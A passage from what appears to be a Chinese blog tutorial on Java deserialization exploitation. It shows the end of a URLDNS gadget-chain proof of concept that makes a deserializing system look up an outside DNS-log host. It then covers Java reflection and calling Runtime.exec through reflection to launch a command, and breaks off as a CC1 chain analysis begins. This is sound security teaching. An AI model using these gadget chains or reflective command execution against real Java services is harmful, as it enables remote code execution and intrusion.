class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNSGadgetChian</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://dsrvtxgjvv.dgrh3.cn&quot;</span>);<br>        <br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">URL</span>&gt; urlClass = url.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashCode</span> <span class="hljs-operator">=</span> urlClass.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        hashCode.setAccessible(<span class="hljs-literal">true</span>);<br>        hashCode.set(url, <span class="hljs-number">1234</span>);<br><br>        HashMap&lt;URL, Integer&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(url, <span class="hljs-number">1</span>);<br><br>        hashCode.set(url, -<span class="hljs-number">1</span>);<br><br>        <span class="hljs-comment">// 序列化hashMap</span><br>        <span class="hljs-type">byte</span>[] ser = ser(hashMap);<br>        System.out.println(Base64.getEncoder().encodeToString(ser));<br><br>        <span class="hljs-comment">// 反序列化</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">deser</span> <span class="hljs-operator">=</span> deser(ser);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] ser(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();   <span class="hljs-comment">//定义字节数组输出流</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);  <span class="hljs-comment">//定义输出流</span><br>        oos.writeObject(o); <span class="hljs-comment">//序列化对象</span><br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deser</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] ser)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(ser);  <span class="hljs-comment">//读取执行字节数组作为输入流</span><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);    <span class="hljs-comment">//将字节输入流作为输入流</span><br>        <span class="hljs-keyword">return</span> ois.readObject();    <span class="hljs-comment">//反序列化读取对象</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="二、Java反射"><a href="#二、Java反射" class="headerlink" title="二、Java反射"></a>二、Java反射</h1><h2 id="2-1-反射的概念"><a href="#2-1-反射的概念" class="headerlink" title="2.1 反射的概念"></a>2.1 反射的概念</h2><h3 id="2-1-1-正射与反射"><a href="#2-1-1-正射与反射" class="headerlink" title="2.1.1 正射与反射"></a>2.1.1 正射与反射</h3><ul><li>正射</li></ul><p>我们在编写代码时，当需要使用到某一个类的时候，都会先了解这个类是做什么的。然后实例化这个类，接着用实例化好的对象进行操作，这就是正射。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>student.doHomework(<span class="hljs-string">&quot;数学&quot;</span>);<br></code></pre></td></tr></table></figure><ul><li>反射</li></ul><p>指在运行时动态地获取类的信息和操作对象的能力。反射允许程序在不知道对象具体类型的情况下，检查和操作类的结构，包括类的方法、字段、构造函数等。</p><p>新建一个类reflection.java获取Person对象；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        Class&lt;?&gt; pClass = Class.forName(<span class="hljs-string">&quot;com.candy.entity.Person&quot;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="2-1-2-Class对象的理解"><a href="#2-1-2-Class对象的理解" class="headerlink" title="2.1.2 Class对象的理解"></a>2.1.2 Class对象的理解</h3><p>我们程序在运行的时候会编译生成一个 <code>.class</code> 文件，而这个 <code>.class</code> 文件中的内容就是相对应的类的所有信息，比如这段程序当中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        Class&lt;?&gt; pClass = Class.forName(<span class="hljs-string">&quot;com.candy.entity.Person&quot;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>其实 <code>person.class</code> 就是 <code>Class</code>，Class 也就是描述类的类。</p><p><strong>Class 类的对象作用</strong>是运行时提供或获得某个类的信息。</p><h2 id="2-2-反射的运用"><a href="#2-2-反射的运用" class="headerlink" title="2.2 反射的运用"></a>2.2 反射的运用</h2><h3 id="2-2-1-反射相关的类"><a href="#2-2-1-反射相关的类" class="headerlink" title="2.2.1 反射相关的类"></a>2.2.1 反射相关的类</h3><p>反射机制相关操作一般位于java.lang.reflect包中。</p><p>java反射机制组成需要重点注意以下的类：</p><ul><li>java.lang.Class：类对象;</li><li>java.lang.reflect.Constructor：类的构造器对象;</li><li>java.lang.reflect.Field：类的属性对象;</li><li>java.lang.reflect.Method：类的方法对象;</li></ul><h3 id="2-2-2-反射的基本操作"><a href="#2-2-2-反射的基本操作" class="headerlink" title="2.2.2 反射的基本操作"></a>2.2.2 反射的基本操作</h3><p>反射在反序列化中一般是扮演者修改值和创建对象的责任，满足一些函数中的判断，保证利用链能够顺利进行；</p><ul><li>实例化类对象</li><li>修改类属性值</li><li>调用类的函数</li></ul><h3 id="2-2-3-获取类Class的方式"><a href="#2-2-3-获取类Class的方式" class="headerlink" title="2.2.3 获取类Class的方式"></a>2.2.3 获取类Class的方式</h3><ol><li>实例化对象的getClass()方法</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><span class="hljs-type">Class</span> <span class="hljs-variable">pClass</span> <span class="hljs-operator">=</span> p.getClass();<br></code></pre></td></tr></table></figure><ol><li>使用类的.class方法</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 该类中必须导入Person类</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br></code></pre></td></tr></table></figure><ol><li>Class.forName(String className)：动态加载类</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">psClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.candy.entity.Person&quot;</span>);<br></code></pre></td></tr></table></figure><p>以上是三种获取Class的方式，以下是一个简单的示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy;<br><br><span class="hljs-keyword">import</span> com.candy.entity.Person;<br><br><span class="hljs-keyword">import</span> java.beans.PersistenceDelegate;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> Deserializatioin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.getClass.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/10/24 16:25</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">getClass</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-comment">// 1. 实例化对象的getClass()方法</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span>&gt; p1Class = p1.getClass();<br>        System.out.println(p1Class.getName());<br><br>        <span class="hljs-comment">// 2. 使用类的.class方法</span><br>        Class&lt;Person&gt; p2Class = Person.class;<br>        System.out.println(p2Class.getName());<br><br>        <span class="hljs-comment">// 3. Class.forName(String className)：动态加载类</span><br>        Class&lt;?&gt; p3Class = Class.forName(<span class="hljs-string">&quot;com.candy.entity.Person&quot;</span>);<br>        System.out.println(p3Class.getName());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-2-4-反射获取和修改属性值"><a href="#2-2-4-反射获取和修改属性值" class="headerlink" title="2.2.4 反射获取和修改属性值"></a>2.2.4 反射获取和修改属性值</h3><p>获取成员变量Field位于 <code>java.lang.reflect.Field</code> 包中</p><ul><li>Field[] getFields() ：获取所有 public 修饰的成员变量</li><li>Field[] getDeclaredFields() 获取所有的成员变量，不考虑修饰符</li><li>Field getField(String name) 获取指定名称的 public 修饰的成员变量</li><li>Field getDeclaredField(String name) 获取指定的成员变量</li></ul><p>设置成员变量Field位于<code>java.lang.reflect.Field</code>包中</p><ul><li>void set(Object obj, Object value)：设置对象obj的Field属性为值value</li></ul><p>在Java反序列化中比较常用的就是<code>getDeclaredField(String name)</code>方法，因为我们需要的是修改指定成员变量的值；<code>getField(String name)</code>有限制只能获取到public修饰的，但是<code>getDeclaredField(String name)</code>无论是否为public修饰都可以获取到。</p><p>当时存在一些特殊情况无法修改类中成员变量的值。那就是final修饰的时候，final修饰直接赋值，反射不能修改值；final修饰间接赋值，可以修改；这里不在演示，碰到的时候就会知道了，情况比较少；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetAndSetField</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;candy&quot;</span>, <span class="hljs-number">18</span>);<br>        System.out.println(p);<br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span>&gt; pClass = p.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> pClass.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);   <span class="hljs-comment">//设置暴力访问</span><br>        name.set(p, <span class="hljs-string">&quot;hacker&quot;</span>);<br><br>        System.out.println(p);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-2-5-反射获取和调用方法"><a href="#2-2-5-反射获取和调用方法" class="headerlink" title="2.2.5 反射获取和调用方法"></a>2.2.5 反射获取和调用方法</h3><p>获取成员方法位于 <code>java.lang.Class</code> 类中：</p><ul><li>Method getMethod(String name, Class&lt;?&gt;… parameterTypes) ：返回该类public修饰的指定名称name的方法</li><li>Method getDeclaredMethod(String name, Class&lt;?&gt;… parameterTypes) ：返回该类指定名称name的方法</li><li>Method[] getMethods() ：获取所有的public方法，包括类自身声明的public方法，父类中的public方法、实现的接口方法</li><li>Method[] getDeclaredMethods() ： 获取该类中的所有方法</li></ul><p>调用成员方法位于<code>java.lang.reflect.Method</code>类中：</p><ul><li>Object invoke(Object obj, Object… args)：调用指定对象obj的方法method，参数为args；</li></ul><p>这里存在一个和获取修改属性值一样的特点，我们比较常用的是<code>getDeclaredMethod(String name, Class&lt;?&gt;... parameterTypes)</code>方法，能够满足更多情况，符合需求；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">customMethod</span><span class="hljs-params">(String str)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;customMethod &quot;</span> + str + <span class="hljs-string">&quot; has been called&quot;</span>);<br>    &#125;<br><span class="hljs-keyword">package</span> com.candy;<br><br><span class="hljs-keyword">import</span> com.candy.entity.Person;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> Deserializatioin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.GetAndInvokeMethod.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/10/24 17:21</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetAndInvokeMethod</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;candy&quot;</span>, <span class="hljs-number">18</span>);<br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span>&gt; pClass = p.getClass();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">toString</span> <span class="hljs-operator">=</span> pClass.getDeclaredMethod(<span class="hljs-string">&quot;customMethod&quot;</span>, String.class);<br>        toString.setAccessible(<span class="hljs-literal">true</span>);<br>        toString.invoke(p, <span class="hljs-string">&quot;invokeTest&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-2-6-反射调用构造函数创建实例"><a href="#2-2-6-反射调用构造函数创建实例" class="headerlink" title="2.2.6 反射调用构造函数创建实例"></a>2.2.6 反射调用构造函数创建实例</h3><p>获取构造函数的方法位于<code>java.lang.Class</code> 类中：</p><ul><li>Constructor&lt;?&gt;[] getConstructors() ：返回public修饰构造函数</li><li>Constructor&lt;?&gt;[] getDeclaredConstructors() ：返回所有构造函数</li><li>Constructor&lt;&gt; getConstructor(Class&lt;?&gt;… parameterTypes) : 匹配和参数配型相符的public构造函数</li><li>Constructor&lt;&gt; getDeclaredConstructor(Class&lt;?&gt;… parameterTypes) ： 匹配和参数配型相符的构造函数</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy;<br><br><span class="hljs-keyword">import</span> com.candy.entity.Person;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> Deserializatioin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.GetAndInvokeConstructor.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/10/24 19:12</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetAndInvokeConstructor</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br>        Class&lt;?&gt; pClass = Class.forName(<span class="hljs-string">&quot;com.candy.entity.Person&quot;</span>);<br><br>        <span class="hljs-comment">// 调用无参构造函数实例化</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p1</span> <span class="hljs-operator">=</span> (Person) pClass.newInstance();<br>        System.out.println(p1);<br><br>        <span class="hljs-comment">// 获取无参构造函数实例化</span><br>        Constructor&lt;?&gt; notParamConstructor = pClass.getDeclaredConstructor();<br>        notParamConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p2</span> <span class="hljs-operator">=</span> (Person)notParamConstructor.newInstance();<br>        System.out.println(p2);<br><br>        <span class="hljs-comment">// 获取有参构造函数实例化</span><br>        Constructor&lt;?&gt; constructor = pClass.getDeclaredConstructor(String.class, <span class="hljs-type">int</span>.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p3</span> <span class="hljs-operator">=</span> (Person) constructor.newInstance(<span class="hljs-string">&quot;candy&quot;</span>, <span class="hljs-number">18</span>);<br>        System.out.println(p3);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-3-利用反射执行命令"><a href="#2-3-利用反射执行命令" class="headerlink" title="2.3 利用反射执行命令"></a>2.3 利用反射执行命令</h2><p>先简单了解一下<code>Runtime</code>类</p><p>在Java编程中，<code>Runtime</code> 类提供了一种与Java应用程序的运行环境进行交互的方式。<code>Runtime</code> 类是一个单例类，它封装了应用程序运行时的环境，通过它，开发者可以访问JVM的某些底层特性和功能。以下是 <code>Runtime</code> 类的主要作用和功能：</p><p> 单例类（Singleton）是一种设计模式，确保一个类只有一个实例，并提供全局访问点。  </p><ol><li>执行系统命令</li></ol><p>可以使用 <code>exec</code> 方法来执行操作系统命令，这在需要与系统进程交互时非常有用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>&#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>    e.printStackTrace();<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>内存管理</li><li>关闭JVM</li><li>添加JVM关闭钩子</li></ol><p>在Java反序列化利用中主要运用的是其执行系统命令的功能，因此只对执行系统命令进行深入。</p><p>在正常情况下，需要通过<code>Runtime</code>类进行命令执行差不多如上述所示；那么问题来了，如何通过反射来调用<code>exec</code>呢？</p><p>来到<code>java.lang.Runtime</code>中发现<code>Runtime()</code>构造方法是私有的，所以我们不能直接通过<code>newInstance</code>去实例化对象，所以引申出以下两种方法调用<code>exec</code>方法</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407301331153.png" alt="img"></p><h3 id="2-3-1-获取构造函数设置暴力访问"><a href="#2-3-1-获取构造函数设置暴力访问" class="headerlink" title="2.3.1 获取构造函数设置暴力访问"></a>2.3.1 获取构造函数设置暴力访问</h3><p>通过反射获取<code>Runtime</code>类的构造函数，设置可访问<code>setAccessible(true)</code>，再实例化对象调用<code>exec</code>函数即可，具体实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mango.reflection;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Project</span> unSerialize</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@File</span> com.mango.reflection.reflectionRuntime.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> mango</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2024/7/30 13:24</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">reflectionRuntime</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, IOException, InvocationTargetException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor();<br>        con.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> con.newInstance();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">mRuntime</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">mExec</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">re</span> <span class="hljs-operator">=</span> mRuntime.invoke(o);<br>        mExec.invoke(re, <span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-3-2-使用单例模式直接调用getRuntime-和exec函数"><a href="#2-3-2-使用单例模式直接调用getRuntime-和exec函数" class="headerlink" title="2.3.2 使用单例模式直接调用getRuntime()和exec函数"></a>2.3.2 使用单例模式直接调用getRuntime()和exec函数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mango.reflection;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Project</span> unSerialize</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@File</span> com.mango.reflection.reflectionRuntime.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> mango</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2024/7/30 13:24</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">reflectionRuntime</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, IOException, InvocationTargetException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">mRuntime</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">mExec</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">re</span> <span class="hljs-operator">=</span> mRuntime.invoke(c);<br>        mExec.invoke(re, <span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="三、CC1利用链分析"><a href="#三、CC1利用链分析" class="headerlink" title="三、CC1利用链分析"></a>三、CC1利用链分析</h1><p>在这里简单介绍一下Common-Collections</p><p><a href="http://commons.apache.org/">Apache 